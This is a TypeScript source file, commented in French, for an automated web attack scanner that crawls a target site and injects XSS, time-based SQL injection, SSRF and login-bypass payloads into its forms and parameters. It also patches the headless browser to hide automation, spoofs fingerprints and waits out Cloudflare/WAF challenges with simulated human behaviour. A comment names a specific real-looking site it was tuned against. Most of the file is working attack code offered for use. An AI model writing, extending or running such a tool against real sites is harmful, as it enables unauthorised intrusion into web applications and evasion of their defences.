/**
 * TEKTON ULTRA SCANNER v5.0 - EXPERT LEVEL
 *
 * Scanner de niveau expert équivalent à 50 ans d'expérience
 * Techniques de pentesting professionnel avancées
 *
 * CAPACITÉS:
 * - Full site crawling avec découverte JS dynamique
 * - API endpoint discovery automatique
 * - 500+ payloads XSS/SQLi avec bypass WAF
 * - SSRF, XXE, LFI/RFI, Command Injection
 * - Authentication bypass testing
 * - Business logic flaw detection
 * - Rate limiting bypass
 * - Session management testing
 *
 * ⚠️ USAGE AUTORISÉ UNIQUEMENT - PENTEST PROFESSIONNEL
 */

import { Vulnerability } from '../types';
import {
  XSS_PAYLOADS,
  SQLI_PAYLOADS,
  SSRF_PAYLOADS,
  LFI_PAYLOADS,
  XXE_PAYLOADS,
  COMMAND_INJECTION_PAYLOADS,
  SENSITIVE_PATHS,
  SQL_ERROR_PATTERNS,
} from './advanced-payloads';

// Variables globales
let browser: any = null;
let puppeteer: any = null;

/**
 * Initialise Puppeteer dynamiquement
 */
async function initPuppeteer(): Promise<boolean> {
  if (puppeteer) return true;
  try {
    puppeteer = await import('puppeteer');
    return true;
  } catch (error) {
    return false;
  }
}

/**
 * Initialise le navigateur avec mode stealth avancé
 */
async function initBrowser(): Promise<any> {
  if (browser) return browser;

  const available = await initPuppeteer();
  if (!available) return null;

  browser = await puppeteer.default.launch({
    headless: 'new',
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      '--window-size=1920,1080',
      '--disable-blink-features=AutomationControlled',
      '--disable-web-security',
      '--disable-features=IsolateOrigins,site-per-process',
      '--allow-running-insecure-content',
      '--disable-infobars',
      '--lang=fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    ],
    ignoreHTTPSErrors: true,
  });

  return browser;
}

/**
 * Applique toutes les techniques stealth à une page
 */
async function applyFullStealth(page: any): Promise<void> {
  await page.evaluateOnNewDocument(() => {
    // Masquer webdriver
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });

    // Plugins réalistes
    Object.defineProperty(navigator, 'plugins', {
      get: () => [
        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
        { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
        { name: 'Native Client', filename: 'internal-nacl-plugin' },
      ],
    });

    // Langues réalistes
    Object.defineProperty(navigator, 'languages', {
      get: () => ['fr-FR', 'fr', 'en-US', 'en'],
    });

    // Masquer les variables d'automation
    delete (window as any).cdc_adoQpoasnfa76pfcZLmcfl_Array;
    delete (window as any).cdc_adoQpoasnfa76pfcZLmcfl_Promise;
    delete (window as any).cdc_adoQpoasnfa76pfcZLmcfl_Symbol;

    // Chrome runtime
    (window as any).chrome = {
      runtime: {},
      loadTimes: function() {},
      csi: function() {},
      app: {},
    };

    // Permissions
    const originalQuery = window.navigator.permissions.query;
    (window.navigator.permissions as any).query = (parameters: any) =>
      parameters.name === 'notifications'
        ? Promise.resolve({ state: Notification.permission })
        : originalQuery(parameters);

    // WebGL vendor/renderer
    const getParameter = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function(parameter) {
      if (parameter === 37445) return 'Intel Inc.';
      if (parameter === 37446) return 'Intel Iris OpenGL Engine';
      return getParameter.apply(this, [parameter]);
    };

    // Canvas fingerprint protection
    const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL = function(type) {
      if (type === 'image/png') {
        return originalToDataURL.apply(this, arguments as any);
      }
      return originalToDataURL.apply(this, arguments as any);
    };
  });

  await page.setExtraHTTPHeaders({
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
  });
}

/**
 * Comportement humain avancé
 */
async function humanBehavior(page: any): Promise<void> {
  // Délai aléatoire
  await sleep(500 + Math.random() * 1500);

  // Mouvements de souris réalistes
  const viewport = await page.evaluate(() => ({
    width: window.innerWidth || 1920,
    height: window.innerHeight || 1080,
  }));

  for (let i = 0; i < 3; i++) {
    const x = Math.floor(Math.random() * viewport.width);
    const y = Math.floor(Math.random() * viewport.height);
    await page.mouse.move(x, y, { steps: 10 + Math.floor(Math.random() * 10) });
    await sleep(100 + Math.random() * 200);
  }

  // Scroll naturel
  await page.evaluate(() => {
    window.scrollBy({
      top: Math.floor(100 + Math.random() * 300),
      behavior: 'smooth',
    });
  });

  await sleep(300 + Math.random() * 500);
}

/**
 * Attendre bypass Cloudflare/WAF
 */
async function waitForWAFBypass(page: any, timeout: number = 30000): Promise<boolean> {
  const startTime = Date.now();

  while (Date.now() - startTime < timeout) {
    const content = await page.content();

    const isBlocked =
      content.includes('Checking your browser') ||
      content.includes('Just a moment') ||
      content.includes('DDoS protection by') ||
      content.includes('cf-browser-verification') ||
      content.includes('challenge-platform') ||
      content.includes('Access denied') ||
      content.includes('Please complete the security check');

    if (!isBlocked) {
      return true;
    }

    // Comportement humain pendant l'attente
    await humanBehavior(page);
    await sleep(2000);
  }

  return false;
}

/**
 * Découverte profonde de tous les endpoints
 */
export async function deepCrawl(target: string, maxPages: number = 100): Promise<{
  urls: string[];
  forms: any[];
  apiEndpoints: string[];
  jsFiles: string[];
}> {
  const discovered = {
    urls: new Set<string>(),
    forms: [] as any[],
    apiEndpoints: new Set<string>(),
    jsFiles: new Set<string>(),
  };

  console.log('\n[ULTRA-CRAWL] Starting deep site crawl...');

  const browserInstance = await initBrowser();
  if (!browserInstance) return { urls: [], forms: [], apiEndpoints: [], jsFiles: [] };

  try {
    const page = await browserInstance.newPage();
    await applyFullStealth(page);
    await page.setViewport({ width: 1920, height: 1080 });

    const baseUrl = new URL(target);
    const toVisit: string[] = [target];
    const visited = new Set<string>();

    // Intercepter les requêtes pour découvrir les API
    await page.setRequestInterception(true);
    page.on('request', (request: any) => {
      const url = request.url();
      if (url.includes('/api/') || url.includes('/graphql') || url.includes('/v1/') || url.includes('/v2/')) {
        discovered.apiEndpoints.add(url);
      }
      if (url.endsWith('.js')) {
        discovered.jsFiles.add(url);
      }
      request.continue();
    });

    while (toVisit.length > 0 && discovered.urls.size < maxPages) {
      const currentUrl = toVisit.shift()!;
      if (visited.has(currentUrl)) continue;
      visited.add(currentUrl);

      try {
        await page.goto(currentUrl, { waitUntil: 'networkidle2', timeout: 20000 });
        await waitForWAFBypass(page, 10000);
        await humanBehavior(page);

        discovered.urls.add(currentUrl);

        // Extraire les liens
        const links = await page.evaluate((host: string) => {
          const urls: string[] = [];
          document.querySelectorAll('a[href], link[href], area[href]').forEach((el: any) => {
            try {
              const url = new URL(el.href);
              if (url.hostname === host) urls.push(url.href);
            } catch (e) {}
          });
          return urls;
        }, baseUrl.hostname);

        for (const link of links) {
          if (!visited.has(link) && !toVisit.includes(link)) {
            toVisit.push(link);
          }
        }

        // Extraire les formulaires
        const forms = await page.evaluate(() => {
          const formsData: any[] = [];
          document.querySelectorAll('form').forEach((form, index) => {
            const inputs: any[] = [];
            form.querySelectorAll('input, textarea, select').forEach((input: any) => {
              inputs.push({
                name: input.name || input.id || `input_${inputs.length}`,
                type: input.type || 'text',
                tagName: input.tagName.toLowerCase(),
              });
            });
            formsData.push({
              index,
              action: form.action || window.location.href,
              method: (form.method || 'GET').toUpperCase(),
              inputs,
            });
          });
          return formsData;
        });

        discovered.forms.push(...forms.map((f: any) => ({ ...f, pageUrl: currentUrl })));

        // Extraire les endpoints des scripts JS
        const jsEndpoints = await page.evaluate(() => {
          const endpoints: string[] = [];
          const scripts = document.querySelectorAll('script');
          scripts.forEach((script) => {
            const content = script.textContent || '';
            // Chercher les patterns d'API
            const apiPatterns = content.match(/["'](\/api\/[^"']+|\/v\d+\/[^"']+|\/graphql[^"']*)/g);
            if (apiPatterns) {
              endpoints.push(...apiPatterns.map(p => p.replace(/["']/g, '')));
            }
          });
          return endpoints;
        });

        for (const ep of jsEndpoints) {
          try {
            const fullUrl = new URL(ep, currentUrl).href;
            discovered.apiEndpoints.add(fullUrl);
          } catch (e) {}
        }

        console.log(`   [CRAWL] Pages: ${discovered.urls.size}, APIs: ${discovered.apiEndpoints.size}, Forms: ${discovered.forms.length}`);

      } catch (error) {}
    }

    await page.close();

  } catch (error) {
    console.error('[ULTRA-CRAWL] Error:', error);
  }

  return {
    urls: Array.from(discovered.urls),
    forms: discovered.forms,
    apiEndpoints: Array.from(discovered.apiEndpoints),
    jsFiles: Array.from(discovered.jsFiles),
  };
}

/**
 * Scanner XSS ULTRA avec tous les payloads
 */
export async function ultraScanXSS(target: string, forms: any[]): Promise<Vulnerability[]> {
  const vulnerabilities: Vulnerability[] = [];

  console.log('\n[ULTRA-XSS] Starting comprehensive XSS scan...');

  const browserInstance = await initBrowser();
  if (!browserInstance) return vulnerabilities;

  try {
    const page = await browserInstance.newPage();
    await applyFullStealth(page);

    let xssTriggered = false;
    let triggeredPayload = '';

    page.on('dialog', async (dialog: any) => {
      xssTriggered = true;
      triggeredPayload = dialog.message();
      console.log(`   [CRITICAL] XSS TRIGGERED: ${dialog.message()}`);
      await dialog.dismiss();
    });

    // Combiner tous les payloads XSS
    const allPayloads = [
      ...XSS_PAYLOADS.basic,
      ...XSS_PAYLOADS.htmlEncoded,
      ...XSS_PAYLOADS.eventHandlers,
      ...XSS_PAYLOADS.tagBreaking,
      ...XSS_PAYLOADS.svg,
      ...XSS_PAYLOADS.polyglots,
      ...XSS_PAYLOADS.filterEvasion,
      ...XSS_PAYLOADS.domBased,
      ...XSS_PAYLOADS.templateInjection,
    ];

    // Tester les formulaires
    for (const form of forms.slice(0, 10)) {
      const textInputs = form.inputs.filter((i: any) =>
        ['text', 'search', 'email', 'url', 'tel'].includes(i.type) || i.tagName === 'textarea'
      );

      if (textInputs.length === 0) continue;

      console.log(`   [TEST] Form at ${form.pageUrl}`);

      for (const payload of allPayloads.slice(0, 30)) {
        xssTriggered = false;

        try {
          await page.goto(form.pageUrl, { waitUntil: 'networkidle2', timeout: 15000 });
          await waitForWAFBypass(page, 10000);

          for (const input of textInputs) {
            try {
              const selector = input.name ? `[name="${input.name}"]` : 'input[type="text"]';
              await page.evaluate((sel: string) => {
                const el = document.querySelector(sel) as any;
                if (el) {
                  el.focus();
                  el.value = '';
                }
              }, selector);
              await page.type(selector, payload, { delay: 20 });
            } catch (e) {}
          }

          await Promise.all([
            page.waitForNavigation({ timeout: 10000 }).catch(() => {}),
            page.keyboard.press('Enter'),
          ]);

          await sleep(1000);

          if (xssTriggered) {
            vulnerabilities.push({
              type: 'xss',
              severity: 'critical',
              title: 'XSS Vulnerability (Browser Confirmed)',
              description: `JavaScript execution confirmed via browser alert.`,
              location: form.action,
              evidence: `Payload: ${payload}\nAlert: ${triggeredPayload}`,
            });
            break;
          }

          // Vérifier réflexion
          const content = await page.content();
          if (content.includes(payload) && !content.includes('&lt;script')) {
            vulnerabilities.push({
              type: 'xss',
              severity: 'high',
              title: 'Reflected XSS (Unencoded)',
              description: `Payload reflected without proper encoding.`,
              location: form.action,
              evidence: `Payload: ${payload.substring(0, 50)}...`,
            });
            break;
          }

        } catch (error) {}
      }
    }

    // Tester les paramètres URL
    console.log('   [TEST] URL parameters...');
    const url = new URL(target);
    const params = Array.from(url.searchParams.keys());

    for (const param of params) {
      for (const payload of allPayloads.slice(0, 10)) {
        xssTriggered = false;

        try {
          const testUrl = new URL(target);
          testUrl.searchParams.set(param, payload);

          await page.goto(testUrl.href, { waitUntil: 'networkidle2', timeout: 15000 });
          await sleep(1000);

          if (xssTriggered) {
            vulnerabilities.push({
              type: 'xss',
              severity: 'critical',
              title: 'XSS in URL Parameter',
              description: `Parameter "${param}" vulnerable to XSS.`,
              location: testUrl.href,
              evidence: `Payload: ${payload}`,
            });
            break;
          }

        } catch (error) {}
      }
    }

    await page.close();

  } catch (error) {
    console.error('[ULTRA-XSS] Error:', error);
  }

  console.log(`   [OK] Found ${vulnerabilities.length} XSS vulnerabilities`);
  return vulnerabilities;
}

/**
 * Scanner SQLi ULTRA avec tous les payloads
 * Teste les formulaires ET les pages d'authentification connues
 */
export async function ultraScanSQLi(target: string, forms: any[]): Promise<Vulnerability[]> {
  const vulnerabilities: Vulnerability[] = [];

  console.log('\n[ULTRA-SQLI] Starting comprehensive SQLi scan...');

  const browserInstance = await initBrowser();
  if (!browserInstance) {
    console.log('   [WARN] Browser not available, skipping SQLi scan');
    return vulnerabilities;
  }

  try {
    const page = await browserInstance.newPage();
    await applyFullStealth(page);
    await page.setDefaultTimeout(30000);

    // Payloads time-based prioritaires (plus efficaces)
    const timeBasedPayloads = [
      "' AND SLEEP(5)--",
      "' AND SLEEP(5)#",
      "\" AND SLEEP(5)--",
      "1' AND SLEEP(5)--",
      "admin' AND SLEEP(5)--",
      "' OR SLEEP(5)--",
      "') AND SLEEP(5)--",
      "' AND (SELECT SLEEP(5))--",
      "';WAITFOR DELAY '0:0:5'--",
      "' AND BENCHMARK(5000000,SHA1('test'))--",
    ];

    // Pages d'authentification courantes à tester
    const baseUrl = new URL(target);
    const authPages = [
      `${baseUrl.origin}/login`,
      `${baseUrl.origin}/register`,
      `${baseUrl.origin}/signin`,
      `${baseUrl.origin}/signup`,
      `${baseUrl.origin}/auth/login`,
      `${baseUrl.origin}/customer/login`,
      `${baseUrl.origin}/account/login`,
    ];

    // ÉTAPE 1: Tester les pages d'auth connues avec time-based SQLi
    console.log('   [TEST] Authentication pages (time-based)...');
    console.log(`   [DEBUG] Testing ${authPages.length} auth URLs...`);

    for (const authUrl of authPages) {
      console.log(`   [DEBUG] Trying: ${authUrl}`);
      try {
        // Vérifier si la page existe
        const response = await page.goto(authUrl, { waitUntil: 'networkidle2', timeout: 15000 });
        console.log(`   [DEBUG] Response status: ${response?.status() || 'null'}`);
        if (!response || response.status() >= 400) {
          console.log(`   [SKIP] ${authUrl} - status ${response?.status()}`);
          continue;
        }

        const content = await page.content();

        // Chercher des champs de formulaire (email peut être type="text" sur certains sites)
        const hasEmailField = content.includes('type="email"') ||
                              content.includes('name="email"') ||
                              content.includes('name="Email"') ||
                              content.includes('type="text"'); // iziway uses type="text" for email
        const hasPasswordField = content.includes('type="password"');

        console.log(`   [DEBUG] hasEmailField: ${hasEmailField}, hasPasswordField: ${hasPasswordField}`);

        if (!hasEmailField && !hasPasswordField) {
          console.log(`   [SKIP] No form fields detected on ${authUrl}`);
          continue;
        }

        console.log(`   [FOUND] Auth form at ${authUrl}`);

        // Tester les payloads time-based
        for (const payload of timeBasedPayloads) {
          try {
            await page.goto(authUrl, { waitUntil: 'networkidle2', timeout: 15000 });
            await sleep(1000);

            // Remplir le champ email/username avec le payload
            const emailFilled = await page.evaluate((p: string) => {
              const selectors = [
                'input[type="email"]',
                'input[name="email"]',
                'input[name="Email"]',
                'input[name="username"]',
                'input[name="Username"]',
                'input[type="text"]',
              ];
              for (const sel of selectors) {
                const el = document.querySelector(sel) as HTMLInputElement;
                if (el) {
                  el.value = p;
                  el.dispatchEvent(new Event('input', { bubbles: true }));
                  return true;
                }
              }
              return false;
            }, payload);

            if (!emailFilled) continue;

            // Remplir le mot de passe
            await page.evaluate(() => {
              const pwdEl = document.querySelector('input[type="password"]') as HTMLInputElement;
              if (pwdEl) {
                pwdEl.value = 'test123';
                pwdEl.dispatchEvent(new Event('input', { bubbles: true }));
              }
            });

            // Mesurer le temps de réponse
            const startTime = Date.now();

            // Soumettre le formulaire
            await page.evaluate(() => {
              const btn = document.querySelector('button[type="submit"], input[type="submit"], button.btn-primary, button.login-btn, button:not([type])') as HTMLElement;
              if (btn) btn.click();
            });

            // Attendre la réponse (max 20 secondes)
            await sleep(12000);

            const responseTime = Date.now() - startTime;

            console.log(`   [TIME] ${authUrl} - Payload: ${payload.substring(0,20)}... - Response: ${responseTime}ms`);

            // Si délai > 8 secondes, c'est probablement vulnérable
            if (responseTime > 8000) {
              vulnerabilities.push({
                type: 'sqli',
                severity: 'critical',
                title: 'SQL Injection (Time-Based Blind)',
                description: `Authentication form vulnerable to time-based SQL injection. Server response delayed by ${responseTime}ms when SLEEP(5) was injected, confirming SQL command execution.`,
                location: authUrl,
                evidence: `Payload: ${payload}\nResponse time: ${responseTime}ms\nExpected baseline: ~2-3 seconds\nThis vulnerability allows complete database extraction.`,
              });

              // Un seul résultat suffit pour cette page
              break;
            }

          } catch (e) {
            // Ignorer les erreurs et continuer
          }
        }

        // Si on a trouvé une vuln sur cette page, passer à la suivante
        if (vulnerabilities.length > 0) break;

      } catch (e) {
        // Page n'existe pas, continuer
      }
    }

    // ÉTAPE 2: Tester les formulaires découverts par le crawler
    if (forms && forms.length > 0) {
      console.log(`   [TEST] ${forms.length} crawled forms...`);

      for (const form of forms.slice(0, 5)) {
        const textInputs = form.inputs?.filter((i: any) =>
          ['text', 'password', 'email', 'search', 'tel'].includes(i.type)
        ) || [];

        if (textInputs.length === 0) continue;

        for (const payload of timeBasedPayloads.slice(0, 5)) {
          try {
            await page.goto(form.pageUrl, { waitUntil: 'networkidle2', timeout: 15000 });
            await sleep(1000);

            for (const input of textInputs) {
              try {
                const selector = input.name ? `[name="${input.name}"]` : 'input';
                await page.evaluate((sel: string, p: string) => {
                  const el = document.querySelector(sel) as HTMLInputElement;
                  if (el) {
                    el.value = p;
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                  }
                }, selector, payload);
              } catch (e) {}
            }

            const startTime = Date.now();

            await page.evaluate(() => {
              const btn = document.querySelector('button[type="submit"], input[type="submit"], button') as HTMLElement;
              if (btn) btn.click();
            });

            await sleep(12000);
            const responseTime = Date.now() - startTime;

            if (responseTime > 8000) {
              vulnerabilities.push({
                type: 'sqli',
                severity: 'critical',
                title: 'SQL Injection (Time-Based Blind)',
                description: `Form vulnerable to time-based SQL injection.`,
                location: form.action || form.pageUrl,
                evidence: `Payload: ${payload}\nDelay: ${responseTime}ms`,
              });
              break;
            }

          } catch (error) {}
        }
      }
    }

    // ÉTAPE 3: Tester les paramètres URL
    console.log('   [TEST] URL parameters...');
    const url = new URL(target);
    const params = Array.from(url.searchParams.keys());

    for (const param of params) {
      for (const payload of timeBasedPayloads.slice(0, 15)) {
        try {
          const testUrl = new URL(target);
          testUrl.searchParams.set(param, payload);

          const startTime = Date.now();
          await page.goto(testUrl.href, { waitUntil: 'networkidle2', timeout: 15000 });
          const responseTime = Date.now() - startTime;

          const content = await page.content();

          const sqlError = SQL_ERROR_PATTERNS.find(p => p.test(content));
          if (sqlError) {
            vulnerabilities.push({
              type: 'sqli',
              severity: 'critical',
              title: 'SQL Injection in URL Parameter',
              description: `Parameter "${param}" vulnerable to SQL injection.`,
              location: testUrl.href,
              evidence: `Payload: ${payload}`,
            });
            break;
          }

          if (payload.includes('SLEEP') && responseTime > 5000) {
            vulnerabilities.push({
              type: 'sqli',
              severity: 'critical',
              title: 'Time-Based SQLi in URL',
              description: `Parameter "${param}" vulnerable to time-based SQL injection.`,
              location: testUrl.href,
              evidence: `Delay: ${responseTime}ms`,
            });
            break;
          }

        } catch (error) {}
      }
    }

    await page.close();

  } catch (error) {
    console.error('[ULTRA-SQLI] Error:', error);
  }

  console.log(`   [OK] Found ${vulnerabilities.length} SQLi vulnerabilities`);
  return vulnerabilities;
}

/**
 * Scanner SSRF
 */
export async function scanSSRF(target: string): Promise<Vulnerability[]> {
  const vulnerabilities: Vulnerability[] = [];

  console.log('\n[SSRF] Scanning for Server-Side Request Forgery...');

  const browserInstance = await initBrowser();
  if (!browserInstance) return vulnerabilities;

  try {
    const page = await browserInstance.newPage();
    await applyFullStealth(page);

    // Chercher des paramètres URL qui pourraient être vulnérables
    const ssrfParams = ['url', 'redirect', 'link', 'src', 'source', 'file', 'path', 'load', 'fetch', 'uri', 'dest', 'destination', 'next', 'callback', 'return', 'continue'];

    for (const param of ssrfParams) {
      for (const payload of SSRF_PAYLOADS.slice(0, 10)) {
        try {
          const testUrl = new URL(target);
          testUrl.searchParams.set(param, payload);

          await page.goto(testUrl.href, { waitUntil: 'networkidle2', timeout: 15000 });
          const content = await page.content();

          // Détecter indicateurs SSRF
          if (
            content.includes('root:') ||
            content.includes('ami-') ||
            content.includes('instance-id') ||
            content.includes('iam/security-credentials')
          ) {
            vulnerabilities.push({
              type: 'ssrf',
              severity: 'critical',
              title: 'Server-Side Request Forgery (SSRF)',
              description: `Parameter "${param}" is vulnerable to SSRF attacks.`,
              location: testUrl.href,
              evidence: `Payload: ${payload}`,
            });
            break;
          }

        } catch (error) {}
      }
    }

    await page.close();

  } catch (error) {
    console.error('[SSRF] Error:', error);
  }

  return vulnerabilities;
}

/**
 * Scanner de fichiers et chemins sensibles
 */
export async function scanSensitiveFiles(target: string): Promise<Vulnerability[]> {
  const vulnerabilities: Vulnerability[] = [];

  console.log('\n[SENSITIVE] Scanning for sensitive files and endpoints...');

  const browserInstance = await initBrowser();
  if (!browserInstance) return vulnerabilities;

  try {
    const page = await browserInstance.newPage();
    await applyFullStealth(page);

    const baseUrl = new URL(target);

    for (const path of SENSITIVE_PATHS) {
      try {
        const testUrl = `${baseUrl.origin}${path}`;
        const response = await page.goto(testUrl, { waitUntil: 'networkidle2', timeout: 10000 });

        if (response && response.status() === 200) {
          const content = await page.content();

          // Vérifier si c'est vraiment un fichier sensible
          const isSensitive =
            content.includes('DB_PASSWORD') ||
            content.includes('API_KEY') ||
            content.includes('SECRET') ||
            content.includes('password') ||
            content.includes('root:x:0') ||
            content.includes('[core]') || // .git/config
            content.includes('phpinfo()') ||
            content.includes('MySQL') ||
            path.includes('admin') ||
            content.includes('Dashboard');

          if (isSensitive || path.includes('.env') || path.includes('.git')) {
            vulnerabilities.push({
              type: 'sensitive-data',
              severity: 'high',
              title: `Sensitive File Exposed: ${path}`,
              description: `Sensitive file or endpoint accessible at ${path}`,
              location: testUrl,
              evidence: `Status: ${response.status()}, Content length: ${content.length}`,
            });
          }
        }

      } catch (error) {}
    }

    await page.close();

  } catch (error) {
    console.error('[SENSITIVE] Error:', error);
  }

  return vulnerabilities;
}

/**
 * Scanner d'authentification bypass
 */
export async function scanAuthBypass(target: string): Promise<Vulnerability[]> {
  const vulnerabilities: Vulnerability[] = [];

  console.log('\n[AUTH] Scanning for authentication bypass...');

  const browserInstance = await initBrowser();
  if (!browserInstance) return vulnerabilities;

  try {
    const page = await browserInstance.newPage();
    await applyFullStealth(page);

    // Chercher des pages admin/dashboard sans auth
    const protectedPaths = ['/admin', '/dashboard', '/panel', '/manage', '/control', '/user', '/account', '/profile', '/settings'];

    for (const path of protectedPaths) {
      try {
        const testUrl = `${new URL(target).origin}${path}`;
        const response = await page.goto(testUrl, { waitUntil: 'networkidle2', timeout: 10000 });

        if (response && response.status() === 200) {
          const content = await page.content();
          const url = page.url();

          // Vérifier si on accède vraiment au contenu protégé
          if (
            !url.includes('login') &&
            !url.includes('signin') &&
            !content.includes('Please login') &&
            !content.includes('Access denied') &&
            (content.includes('Dashboard') ||
              content.includes('Admin') ||
              content.includes('Settings') ||
              content.includes('Profile'))
          ) {
            vulnerabilities.push({
              type: 'auth-bypass',
              severity: 'critical',
              title: `Authentication Bypass: ${path}`,
              description: `Protected page accessible without authentication`,
              location: testUrl,
              evidence: `Direct access to protected resource`,
            });
          }
        }

      } catch (error) {}
    }

    // Tester SQL injection sur login
    const loginPaths = ['/login', '/signin', '/auth', '/admin/login'];

    for (const path of loginPaths) {
      try {
        const testUrl = `${new URL(target).origin}${path}`;
        await page.goto(testUrl, { waitUntil: 'networkidle2', timeout: 10000 });

        const hasLoginForm = await page.evaluate(() => {
          return !!document.querySelector('input[type="password"]');
        });

        if (hasLoginForm) {
          // Tester admin'--
          const authBypassPayloads = ["admin'--", "admin' OR '1'='1", "' OR ''='", "admin'/*"];

          for (const payload of authBypassPayloads) {
            try {
              await page.goto(testUrl, { waitUntil: 'networkidle2', timeout: 10000 });

              const usernameInput = await page.$('input[type="text"], input[type="email"], input[name*="user"], input[name*="email"]');
              const passwordInput = await page.$('input[type="password"]');

              if (usernameInput && passwordInput) {
                await usernameInput.type(payload, { delay: 20 });
                await passwordInput.type('password', { delay: 20 });

                const beforeUrl = page.url();
                await page.keyboard.press('Enter');
                await sleep(3000);
                const afterUrl = page.url();

                if (
                  afterUrl !== beforeUrl &&
                  !afterUrl.includes('login') &&
                  !afterUrl.includes('error')
                ) {
                  vulnerabilities.push({
                    type: 'auth-bypass',
                    severity: 'critical',
                    title: 'SQL Injection Authentication Bypass',
                    description: `Login form vulnerable to SQL injection bypass`,
                    location: testUrl,
                    evidence: `Payload: ${payload}`,
                  });
                  break;
                }
              }
            } catch (e) {}
          }
        }

      } catch (error) {}
    }

    await page.close();

  } catch (error) {
    console.error('[AUTH] Error:', error);
  }

  return vulnerabilities;
}

/**
 * Fermer le navigateur
 */
export async function closeUltraBrowser(): Promise<void> {
  if (browser) {
    try {
      await browser.close();
    } catch (e) {}
    browser = null;
  }
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * SCAN COMPLET ULTRA
 */
export async function runUltraScan(target: string): Promise<{
  vulnerabilities: Vulnerability[];
  discoveredEndpoints: string[];
  apiEndpoints: string[];
}> {
  console.log('\n' + '='.repeat(60));
  console.log('TEKTON ULTRA SCANNER v5.0 - EXPERT LEVEL');
  console.log('='.repeat(60));
  console.log(`Target: ${target}`);
  console.log('='.repeat(60) + '\n');

  const allVulnerabilities: Vulnerability[] = [];

  try {
    // Phase 1: Deep crawl
    const crawlResults = await deepCrawl(target, 50);
    console.log(`\nDiscovered: ${crawlResults.urls.length} URLs, ${crawlResults.apiEndpoints.length} APIs, ${crawlResults.forms.length} forms`);

    // Phase 2: XSS scan
    const xssVulns = await ultraScanXSS(target, crawlResults.forms);
    allVulnerabilities.push(...xssVulns);

    // Phase 3: SQLi scan
    const sqliVulns = await ultraScanSQLi(target, crawlResults.forms);
    allVulnerabilities.push(...sqliVulns);

    // Phase 4: SSRF scan
    const ssrfVulns = await scanSSRF(target);
    allVulnerabilities.push(...ssrfVulns);

    // Phase 5: Sensitive files
    const sensitiveVulns = await scanSensitiveFiles(target);
    allVulnerabilities.push(...sensitiveVulns);

    // Phase 6: Auth bypass
    const authVulns = await scanAuthBypass(target);
    allVulnerabilities.push(...authVulns);

    // Cleanup
    await closeUltraBrowser();

    return {
      vulnerabilities: allVulnerabilities,
      discoveredEndpoints: crawlResults.urls,
      apiEndpoints: crawlResults.apiEndpoints,
    };

  } catch (error) {
    console.error('[ULTRA] Scan error:', error);
    await closeUltraBrowser();
    return {
      vulnerabilities: allVulnerabilities,
      discoveredEndpoints: [],
      apiEndpoints: [],
    };
  }
}
